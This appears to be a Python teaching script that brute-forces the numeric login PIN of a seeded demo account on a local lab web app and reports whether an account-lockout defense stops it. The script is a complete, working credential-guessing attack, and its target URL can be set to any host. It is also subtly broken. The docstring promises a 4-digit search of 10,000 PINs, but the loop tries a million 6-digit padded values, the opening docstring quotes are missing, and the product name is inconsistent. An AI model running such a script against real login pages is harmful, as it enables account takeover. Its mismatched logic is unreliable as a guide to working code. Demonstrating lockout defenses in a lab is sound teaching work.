Instagrom Classroom Brute-Force Demonstration Script
=======================================================
This script is strictly for educational purposes in a controlled classroom lab.
It demonstrates why 4-digit numeric PINs with NO rate limiting or lockout
are vulnerable to exhaustive keyspace search (only 10,000 possibilities: 0000-9999).
It also demonstrates how enabling the Account Lockout Defense in the Admin Console
immediately halts and defeats this attack!

Supports deployment environments gated by HTTP Basic Auth (DEMO_USER / DEMO_PASS).
"""

import os
import time
import base64
import urllib.request
import urllib.parse

TARGET_URL = os.environ.get("TARGET_URL", "http://127.0.0.1:5000/login")
TARGET_USERNAME = os.environ.get("TARGET_USERNAME", "ak47")  # Pre-seeded demo account with PIN 1234

demo_user = os.environ.get("DEMO_USER")
demo_pass = os.environ.get("DEMO_PASS")
auth_header = None
if demo_user and demo_pass:
    token = base64.b64encode(f"{demo_user}:{demo_pass}".encode()).decode()
    auth_header = f"Basic {token}"

class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

opener = urllib.request.build_opener(NoRedirectHandler)

print("=" * 65)
print(" INSTAGRAMMAR CLASSROOM BRUTE FORCE DEMONSTRATION")
print(f" Target URL: {TARGET_URL}")
print(f" Target Username: {TARGET_USERNAME}")
if auth_header:
    print(f" Basic Auth: Active ({demo_user})")
else:
    print(" Basic Auth: Not configured (running without header)")
print(" Search Space: 0000 -> 9999 (10,000 combinations)")
print("=" * 65)

start_time = time.time()
attempts = 0
found_pin = None
was_locked = False

for pin_num in range(1000000):
    pin = f"{pin_num:06d}"
    attempts += 1

    post_data = urllib.parse.urlencode({
        "username": TARGET_USERNAME,
        "password": pin
    }).encode("utf-8")

    req = urllib.request.Request(TARGET_URL, data=post_data, method="POST")
    if auth_header:
        req.add_header("Authorization", auth_header)

    try:
        response = opener.open(req)
        content = response.read().decode("utf-8", errors="ignore")
        
        # Check if the lockout defense triggered
        if "temporarily locked" in content.lower():
            was_locked = True
            break

    except urllib.error.HTTPError as e:
        # HTTP 302 redirect indicates successful login redirect to /feed
        if e.code == 302:
            location = e.headers.get("Location", "")
            if "login" not in location:
                found_pin = pin
                break
        elif e.code == 401:
            print("\n[-] Error: HTTP 401 Unauthorized! The app is gated with HTTP Basic Auth.")
            print("    Please set DEMO_USER and DEMO_PASS environment variables before running.")
            break
    except urllib.error.URLError as e:
        print(f"\n[-] Error: Could not connect to {TARGET_URL}.")
        print("    Please ensure Instagrammar is running (`python app.py`).")
        break

    if attempts % 2000 == 0:
        elapsed = time.time() - start_time
        rate = attempts / elapsed if elapsed > 0 else 0
        print(f"[*] Tested {attempts} PINs... Current: {pin} ({rate:.1f} req/sec)")

elapsed = time.time() - start_time
print("=" * 65)
if was_locked:
    print(f"[!] DEFENSE ACTIVE! Account '{TARGET_USERNAME}' was LOCKED after {attempts} attempts.")
    print(f"[!] Elapsed time: {elapsed:.2f} seconds.")
    print("[+] Classroom Takeaway: The Account Lockout system successfully")
    print("    neutralized the brute-force attack! Check the Instructor Admin")
    print("    dashboard to view the locked account status and audit log.")
elif found_pin:
    print(f"[+] SUCCESS! Discovered PIN for '{TARGET_USERNAME}': {found_pin}")
    print(f"[+] Total attempts: {attempts}")
    print(f"[+] Elapsed time: {elapsed:.2f} seconds ({attempts / elapsed:.1f} req/s)")
    print("[+] Classroom Takeaway: Without rate limiting or lockout, 4-digit PINs")
    print("    can be cracked rapidly even over standard HTTP!")
else:
    print("[-] Finished without finding PIN or server was unavailable.")
print("=" * 65)